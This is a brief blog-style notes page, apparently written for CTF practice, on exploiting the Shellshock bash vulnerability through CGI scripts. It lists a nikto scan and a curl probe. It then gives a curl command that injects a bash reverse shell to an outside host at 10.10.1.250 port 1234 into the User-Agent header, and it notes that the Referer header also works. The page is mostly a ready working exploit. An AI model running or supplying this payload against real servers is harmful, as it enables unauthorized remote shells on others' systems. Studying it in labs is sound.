---
description: >-
  Shellshock
title: Shellshock              # Add title here
date: 2022-08-12 08:00:00 -0600                           # Change the date to match completion date
categories: [06 Exploitation, Shellshock]                     # Change Templates to Writeup
tags: [exploitation, rce, shellshock]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Finding the Vulnerability
First you need to find a script (.sh,.pl,.cgi,etc.), most commonly under cgi-bin folder, for this task the best tool is nikto:
```bash
nikto -h <IP>
```

### Testing the Vulnerability
If we receive the "vulnerable" output the server is vulnerable
```bash
kali@kali#~ curl -H "User-agent: () { :;}; echo; echo vulnerable" http://10.0.30.121/cgi-bin/uptime
vulnerable
```

### User-Agent
Next with curl we can abuse of the legacy version of outdated bash which accepts some payloads:
```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.1.250/1234 0>&1" http://10.0.30.121/cgi-bin/uptime
```
Examples:
[ECHO CTF legacy](https://echoctf.red/target/35)

> It is possible to abuse this vulnerability on HTTP Header "Referer" instead of "User-Agent".
{: .prompt-info }

### References
[cgi-bin Exploitation](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)